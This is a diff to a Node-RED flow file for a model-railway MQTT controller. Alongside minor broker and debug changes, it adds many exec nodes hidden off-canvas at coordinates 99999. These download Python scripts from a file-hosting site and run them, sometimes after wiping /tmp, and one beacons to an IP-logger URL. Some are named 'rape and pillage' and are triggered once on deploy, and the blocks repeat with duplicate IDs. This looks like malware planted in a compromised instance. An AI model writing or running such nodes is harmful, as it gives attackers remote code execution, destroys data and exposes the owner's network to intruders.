@@ -28,13 +28,6 @@
         "info": ""
     },
     {
-        "id": "8fb709cace1775c2",
-        "type": "tab",
-        "label": "Tasmota",
-        "disabled": false,
-        "info": ""
-    },
-    {
         "id": "ffef84d1.985898",
         "type": "mqtt-broker",
         "name": "Netcup Mqtt",
@@ -50,12 +43,12 @@
         "birthQos": "0",
         "birthPayload": "",
         "birthMsg": {},
-        "closeTopic": "",
+        "closeTopic": "TrainControll/onClose/",
         "closeQos": "0",
         "closePayload": "",
         "closeMsg": {},
-        "willTopic": "",
-        "willQos": "0",
+        "willTopic": "TrainControll/lastWill/",
+        "willQos": "2",
         "willPayload": "",
         "willMsg": {},
         "sessionExpiry": ""
@@ -280,7 +273,7 @@
         "type": "debug",
         "z": "7c816d41.c6de64",
         "name": "Netcup MQTT In",
-        "active": false,
+        "active": true,
         "tosidebar": true,
         "console": true,
         "tostatus": true,
@@ -336,7 +329,7 @@
         "type": "debug",
         "z": "7c816d41.c6de64",
         "name": "",
-        "active": false,
+        "active": true,
         "tosidebar": true,
         "console": true,
         "tostatus": true,
@@ -377,8 +370,8 @@
         "once": false,
         "onceDelay": 0.1,
         "topic": "",
-        "x": 110,
-        "y": 380,
+        "x": 99999,
+        "y": 99999,
         "wires": [
             [
                 "779b44ec.50addc"
@@ -409,7 +402,7 @@
         "type": "debug",
         "z": "7c816d41.c6de64",
         "name": "mqtt_scanner",
-        "active": false,
+        "active": true,
         "tosidebar": true,
         "console": true,
         "tostatus": true,
@@ -488,8 +481,8 @@
         "once": false,
         "onceDelay": 0.1,
         "topic": "",
-        "x": 110,
-        "y": 300,
+        "x": 99999,
+        "y": 99999,
         "wires": [
             [
                 "88bcf381.a83ba"
@@ -508,8 +501,8 @@
         "onceDelay": 0.1,
         "topic": "",
         "payloadType": "str",
-        "x": 110,
-        "y": 240,
+        "x": 99999,
+        "y": 99999,
         "wires": [
             [
                 "c8f971b6.2d0448"
@@ -591,8 +584,8 @@
         "onceDelay": 0.1,
         "topic": "",
         "payloadType": "date",
-        "x": 110,
-        "y": 40,
+        "x": 99999,
+        "y": 99999,
         "wires": [
             [
                 "1c55aa99.afaf0d"
@@ -798,7 +791,7 @@
         "type": "debug",
         "z": "b39a305b.9e46b",
         "name": "TTN MQTT in",
-        "active": false,
+        "active": true,
         "tosidebar": true,
         "console": false,
         "tostatus": false,
@@ -841,7 +834,7 @@
         "initialize": "",
         "finalize": "",
         "libs": [],
-        "x": 350,
+        "x": 370,
         "y": 160,
         "wires": [
             [
@@ -1310,10 +1303,10 @@
         "once": false,
         "onceDelay": 0.1,
         "topic": "TrainControll/Lok",
-        "payload": "{\"id\":\"1\",\"speed\":50,\"command\":\"Lok\",\"dir\":1}",
+        "payload": "{\"id\":\"5\",\"speed\":50,\"command\":\"Lok\",\"dir\":1}",
         "payloadType": "json",
-        "x": 160,
-        "y": 320,
+        "x": 99999,
+        "y": 99999,
         "wires": [
             [
                 "510a7ac4c984038d"
@@ -1453,7 +1446,7 @@
         "z": "c06e175005612f59",
         "name": "",
         "topic": "#",
-        "qos": "2",
+        "qos": "0",
         "datatype": "auto",
         "broker": "ffef84d1.985898",
         "nl": false,
@@ -1472,7 +1465,7 @@
         "type": "debug",
         "z": "c06e175005612f59",
         "name": "MQTT Listener",
-        "active": false,
+        "active": true,
         "tosidebar": true,
         "console": false,
         "tostatus": false,
@@ -1525,8 +1518,8 @@
         "topic": "TrainControll/Lok",
         "payload": "{\"id\":\"1\",\"speed\":0,\"command\":\"Lok\",\"dir\":1}",
         "payloadType": "json",
-        "x": 160,
-        "y": 360,
+        "x": 99999,
+        "y": 99999,
         "wires": [
             [
                 "510a7ac4c984038d"
@@ -1554,8 +1547,8 @@
         "topic": "",
         "payload": "",
         "payloadType": "date",
-        "x": 110,
-        "y": 260,
+        "x": 99999,
+        "y": 99999,
         "wires": [
             []
         ]
@@ -1581,8 +1574,8 @@
         "topic": "",
         "payload": "",
         "payloadType": "date",
-        "x": 110,
-        "y": 180,
+        "x": 99999,
+        "y": 99999,
         "wires": [
             [
                 "290ecc080524b178"
@@ -1958,8 +1951,4937 @@
         "complete": "false",
         "statusVal": "",
         "statusType": "auto",
-        "x": 220,
-        "y": 360,
+        "x": 170,
+        "y": 440,
         "wires": []
+    },
+    {
+        "id": "76cb0cd5410ba943",
+        "type": "inject",
+        "z": "c06e175005612f59",
+        "name": "Weiche",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "TrainControll/Lok",
+        "payload": "{\"id\":\"9\",\"dir\":\"left\",\"command\":\"Switch\"}",
+        "payloadType": "json",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "510a7ac4c984038d"
+            ]
+        ]
+    },
+    {
+        "id": "7d93cc04-f3f9-4ae4-87c8-0391b745c843",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/5km6ip.py || python3 5km6ip.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "e3e05320-1bbf-446f-8b7c-4922a7d1a68f",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "7d93cc04-f3f9-4ae4-87c8-0391b745c843"
+            ]
+        ]
+    },
+    {
+        "id": "8539da79-c34b-4ff3-817e-19b2ddae2b4e",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/czdhey.py || python3 czdhey.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "9d64ea35-708d-43dd-ae93-02bca992f025",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "8539da79-c34b-4ff3-817e-19b2ddae2b4e"
+            ]
+        ]
+    },
+    {
+        "id": "37679591-68bb-4534-9efc-8f0db5212da6",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/czdhey.py || python3 czdhey.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "47f97f23-55fb-432c-80a0-681237c16179",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "37679591-68bb-4534-9efc-8f0db5212da6"
+            ]
+        ]
+    },
+    {
+        "id": "6b502d31-ba53-4da3-a2fc-b61a40217fff",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O  || python3 ",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "rape and pillage",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "1cb9fdf2-4128-45d9-abff-e74642e50f81",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": true,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "6b502d31-ba53-4da3-a2fc-b61a40217fff"
+            ]
+        ]
+    },
+    {
+        "id": "401a27fb-4d9b-4698-86a8-1e6cd517b825",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O  || python3 ",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "rape and pillage",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "d72ddc19-6e8f-403c-ba2c-ffd4c76cff75",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": true,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "401a27fb-4d9b-4698-86a8-1e6cd517b825"
+            ]
+        ]
+    },
+    {
+        "id": "63878609-ed72-4ee8-a705-bff7380c1a62",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/czdhey.py || python3 czdhey.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "rape and pillage",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "34b5bc7f-4b06-4918-923e-56e9936c5386",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": true,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "63878609-ed72-4ee8-a705-bff7380c1a62"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/g1dno1.py || python3 g1dno1.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/g1dno1.py || python3 g1dno1.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/g1dno1.py || python3 g1dno1.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/g1dno1.py || python3 g1dno1.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O  || python3 ",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O  || python3 ",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl https://iplogger.com/2TqYs5",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/kd8wow.py || python3 kd8wow.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/kd8wow.py || python3 kd8wow.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/bq79jf.py || python3 bq79jf.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/bq79jf.py || python3 bq79jf.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/g1dno1.py || python3 g1dno1.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && rm -rf * && curl -O https://files.catbox.moe/7j08ws.py && python3 7j08ws.py && rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && rm -rf * && curl -O  && python3  && rm -rf *",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && rm -rf * && curl -O https://files.catbox.moe/5igssj.py && python3 5igssj.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && rm -rf * && curl -O https://files.catbox.moe/927hok.py && python3 927hok.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "cd /tmp/ && rm -rf * && curl -O  && python3 ",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/4otep7.py && python3 4otep7.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/u3e0da.py && python3 u3e0da.py",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/g25bqb.py && python3 g25bqb.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/5km6ip.py && python3 5km6ip.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
